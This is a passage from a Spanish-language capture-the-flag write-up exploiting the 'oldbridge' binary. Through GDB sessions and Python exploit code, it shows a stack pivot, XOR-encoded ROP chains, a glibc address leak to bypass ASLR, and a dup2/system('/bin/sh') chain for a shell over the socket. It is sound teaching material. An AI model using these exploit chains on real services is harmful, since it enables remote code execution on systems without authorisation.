</code></pre></div><p>Pero no funciona ni en el lado del cliente ni en el lado del servidor. El tema es que no hay suficiente espacio para una cadena ROP, solo para una dirección que sobrescribe la dirección de retorno.</p><h3 id="_stack-pivot_"><em>Stack Pivot</em></h3><p>Por lo tanto, debemos encontrar una manera de hacer un <em>Stack Pivot</em>. Por suerte, tenemos una función <code>helper</code> para ayudarnos a realizar esta técnica:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=helper <span class="mtku">oldbridge</span>

oldbridge:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.got:

Disassembly of section .text:

0000000000000b3a &lt;helper&gt;:
 b3a:   55                      push   rbp
 b3b:   48 89 e5                mov    rbp,rsp
 b3e:   48 83 ec 10             sub    rsp,0x10
 b42:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
 b49:   00 00
 b4b:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
 b4f:   31 c0                   xor    eax,eax
 b51:   58                      pop    rax
 b52:   c3                      ret
 b53:   5a                      pop    rdx
 b54:   c3                      ret
 b55:   0f 05                   syscall
 b57:   c3                      ret
 b58:   90                      nop
 b59:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
 b5d:   64 48 33 04 25 28 00    xor    rax,QWORD PTR fs:0x28
 b64:   00 00
 b66:   74 05                   je     b6d &lt;helper+0x33&gt;
 b68:   e8 b3 fd ff ff          call   920 &lt;__stack_chk_fail@plt&gt;  
 b6d:   c9                      leave
 b6e:   c3                      ret

Disassembly of section .fini:
</code></pre></div><p>La clave aquí son las instrucciones <code>leave; ret</code> en el <em>offset</em> <code>0xb6d</code>. Esas instrucciones forman un <em>gadget</em> que nos permite establecer el puntero de la pila en el mismo valor que <code>$rbp</code> ya que <code>leave</code> es lo mismo que <code>mov rbp, rsp; pop rbp</code>. Y luego el <code>ret</code> nos llevará a la dirección señalada por <code>$rbp</code>, que podemos controlar.</p><p>La estrategia es ingresar la cadena ROP en la sección de relleno del <em>payload</em> y establecer <code>$rbp</code> en ese punto.</p><p>Ejecutemos el <em>exploit</em> con GDB adjunto y luego veamos dónde está <code>$rbp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)  
<span class="code-red">gef➤</span>  run 1234
Starting program: ./oldbridge 1234
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b'\r\xb0\xff#\x10%\xbb\x10'
[<span class="code-green">+</span>] XOR saved $rbp: b'\xcd\xeb\xf2\xf2\xf2r\r\r'  
[<span class="code-green">+</span>] XOR return address: b'\xc2\x03MXXX\r\r'
[<span class="code-green">+</span>] Canary: 0x1db6281d2ef2bd00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffffffe6c0
[<span class="code-green">+</span>] Return address: 0x555555400ecf
[<span class="code-green">+</span>] ELF base address: 0x555555400000
</code></pre></div><p>Muy bien, tenemos <code>0x7fffffffe6c0</code> como el valor del <code>$rbp</code> guardado. Pongamos un <em>breakpoint</em> en GDB y ejecutemos nuevamente el <em>exploit</em> para verificar más cosas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[Detaching after fork from child process 139491]
^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ee3107</span> in <span class="code-dark-yellow">__libc_accept</span> (<span class="code-dark-cyan">fd</span>=0x3, <span class="code-dark-cyan">addr</span>=..., <span class="code-dark-cyan">len</span>=0x7fffffffe678) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/accept.c</span>:26  
26      ../sysdeps/unix/sysv/linux/accept.c: No such file or directory.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set follow-fork-mode child  
<span class="code-green">gef➤</span>  break *check_username+95
Breakpoint 1 at <span class="code-dark-blue">0x555555400bce</span>
<span class="code-green">gef➤</span>  continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234  
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-blue">...../..</span>] XOR Canary: b'\r\x00'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[Attaching after process 133185 fork to child process 143736]
[New inferior 2 (process 143736)]
[Detaching after fork from parent process 133185]
[Inferior 1 (process 133185) detached]
[Switching to process 143736]

Thread 2.1 "oldbridge" hit Breakpoint 1, <span class="code-dark-blue">0x0000555555400bce</span> in <span class="code-dark-yellow">check_username</span> ()  
</code></pre></div><p>Ahora podemos mostrar el contenido de <code>$rbp</code> en este punto (justo después de la llamada <code>read</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rbp
$1 = 0x7fffffffe650
<span class="code-green">gef➤</span>  x/gx 0x7fffffffe650
<span class="code-dark-blue">0x7fffffffe650</span>: 0x00007fffffffe6c0  
</code></pre></div><p>Vemos que <code>$rbo</code> contiene una dirección (<code>0x7fffffffe650</code>), y dentro de esta dirección encontramos nuestro valor extraído (<code>0x00007fffffffe6c0</code>). Difieren en <code>0x70</code>.</p><p>Ahora encontremos la dirección de pila donde comienza nuestro <em>payload</em> (podemos buscar <code>davide</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep davide
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">davide</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe240 - 0x7fffffffe277  →   "<span class="code-dark-magenta">davideAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]</span>"  
</code></pre></div><p>Y la distancia entre nuestro <em>payload</em> y la dirección almacenada en <code>$rbp</code> es <code>0x410</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rbp - 0x7fffffffe240  
$2 = 0x410
</code></pre></div><p>Ahora, la idea es establecer <code>$rbp</code> para indicar esta dirección más <code>0x70</code> y menos <code>0x8</code> para evitar problemas de alineación de la pila.</p><p>Por el momento, reciclaremos la cadena ROP anterior para ver si funciona. Pero no lo hace. Tal vez sea por usar <code>printf</code>. En cambio, podemos usar <code>write</code>, que necesita dos argumentos (el descriptor de archivo donde escribir y la dirección de la cadena a escribir). El segundo argumento irá en <code>$rsi</code>, por lo que necesitamos otro gadget, y también la dirección de <code>write</code> en la PLT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rsi'</span>
0x0000000000000f71 : <span class="code-red">pop rsi</span> ; pop r15 ; ret

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> write
0000000000000910 &lt;<span class="code-red">write</span>@plt&gt;:
 910:   ff 25 0a 17 20 00       jmpq   *0x20170a(%rip)        # 202020 &lt;<span class="code-red">write</span>@GLIBC_2.2.5&gt;  
 bad:   e8 5e fd ff ff          callq  910 &lt;<span class="code-red">write</span>@plt&gt;
 ee4:   e8 27 fa ff ff          callq  910 &lt;<span class="code-red">write</span>@plt&gt;
</code></pre></div><p>Ahora este es el <em>payload</em> de la cadena ROP, con la técnica de <em>Stack Pivot</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">pop_rdi_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f73</span>
    <span class="mtk1">pop_rsi_pop_r15_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f71</span>
    <span class="mtk1">leave_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6d</span>

    <span class="mtk1">printf_got</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">202038</span>
    <span class="mtk1">write_plt</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">910</span>
    <span class="mtk1">check_username_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6f</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">username</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">))</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">1</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rsi_pop_r15_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">printf_got</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">write_plt</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">check_username_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>  
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">saved_rbp</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">478</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">leave_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Observe que <code>0x478</code> es<code> 0x410</code> más <code>0x70</code> y menos<code> 0x8</code>, como se dijo antes.</p><h3 id="fugando-direcciones-de-glibc">Fugando direcciones de Glibc</h3><p>Si lo ejecutamos, encontramos que se llama e imprime algunos bytes sin procesar (no visibles) y <code>Username:</code> justo después, lo que significa que imprimimos los bytes de una dirección y ejecutamos <code>check_username</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive  
<span class="code-red">$</span>
[<span class="code-blue">*</span>] Interrupted
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234
*** stack smashing detected ***: terminated  
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
...
Username found!
Username found!
Username found!
...
Username found!
KUsername:
</code></pre></div><p>Para obtener la fuga en nuestro lado, debemos cambiar el descriptor del archivo (<code>1</code> fue para <code>stdout</code>, solo para fines de prueba). Los descriptores de archivos de <em>socket</em> generalmente están por encima de <code>3</code>. Podemos intentar hasta que encontremos el correcto.</p><p>A nivel local, es <code>4</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000  
[<span class="code-blue">*</span>] Switching to interactive mode
\x90\x00\x84K\x7fUsername: <span class="code-red">$</span>
[<span class="code-blue">*</span>] Interrupted
</code></pre></div><p>Y allí tenemos la fuga para burlar ASLR en Glibc. Ahora podemos tomarlo y calcular la dirección base de Glibc (nuevamente, en local):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">oldbridge</span>
        linux-vdso.so.1 (0x00007ffc43fd4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcf014d5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fcf018de000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' write'</span>
   900: 00000000001144a0   153 FUNC    WEAK   DEFAULT   15 <span class="code-red">write</span>v@@GLIBC_2.2.5  
  2281: 000000000010e090   153 FUNC    WEAK   DEFAULT   15 <span class="code-red">write</span>@@GLIBC_2.2.5
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>

    <span class="mtk1">write_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">rstrip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">write()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">write_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

    <span class="mtk1">write_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">10e090</span>
    <span class="mtk1">glibc_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">write_addr</span> <span class="mtk5">-</span> <span class="mtk1">write_offset</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-green">+</span>] Leaked write() address: 0x7f4b84af0090
[<span class="code-green">+</span>] Glibc base address: 0x7f4b849e2000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1234  
</code></pre></div><h3 id="obteniendo-rce">Obteniendo RCE</h3><p>Todo correcto. Ahora, para obtener una <em>shell</em> interactiva, necesitamos usar la conexión de <em>socket</em>. No podemos usar una <em>reverse shell</em> porque la instancia remota no tiene acceso a Internet.</p><p>Por lo tanto, llamaremos a <code>dup2</code> para duplicar el descriptor de archivo del socket (<code>4</code>) en <code>stdin</code> (<code>0</code>), <code>stdout</code> (<code>1</code>) y <code>stderr</code> (<code>2</code>). Finalmente, llamaremos a <code>system("/bin/sh")</code> para obtener una <em>shell</em> interactiva sobre la conexión del <em>socket</em>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> dup2
   627: 000000000010e8f0    37 FUNC    GLOBAL DEFAULT   15 __<span class="code-red">dup2</span>@@GLIBC_2.2.5
  1017: 000000000010e8f0    37 FUNC    WEAK   DEFAULT   15 <span class="code-red">dup2</span>@@GLIBC_2.2.5

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 0000000000153a00   103 FUNC    GLOBAL DEFAULT   15 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 00000000000522c0    45 FUNC    GLOBAL DEFAULT   15 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 00000000000522c0    45 FUNC    WEAK   DEFAULT   15 <span class="code-red">system</span>@@GLIBC_2.2.5

<span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh
 1b45bd <span class="code-red">/bin/sh</span>
</code></pre></div><p>Podemos usar un bucle para duplicar los descriptores del archivo más fácilmente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">dup2_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">10e8f0</span>
    <span class="mtk1">system_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">522c0</span>
    <span class="mtk1">bin_sh_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">1b45bd</span>

    <span class="mtk1">dup2_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">dup2_offset</span>
    <span class="mtk1">system_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">system_offset</span>
    <span class="mtk1">bin_sh_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">bin_sh_offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">username</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">))</span>

    <span class="mtk5">for</span> <span class="mtk1">fd</span> <span class="mtk5">in</span> <span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">]:</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(socket_fd),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rsi_pop_r15_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">fd</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">dup2_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">system_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>  
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">saved_rbp</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">478</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">leave_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
